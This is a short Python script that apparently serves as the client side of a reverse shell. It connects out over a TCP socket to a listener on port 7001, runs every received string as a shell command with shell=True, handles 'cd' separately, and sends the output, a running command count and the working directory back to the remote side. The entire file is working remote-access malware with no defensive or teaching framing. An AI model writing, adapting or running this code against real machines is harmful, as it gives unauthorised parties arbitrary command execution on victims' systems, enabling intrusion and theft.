import socket
import os
import subprocess

HOST = socket.gethostbyname(socket.gethostname())
port = 7001

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, port))
operations = 0

while True:
    
    data = sock.recv(1024)
    if len(data):
        operations += 1

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        final_output = f'{output_str}NUMBER_OF_EXECUTED_COMMANDS : {operations}\n'
        currentWD = os.getcwd() + "> "
        sock.send(str.encode(final_output + currentWD))
        print(output_str)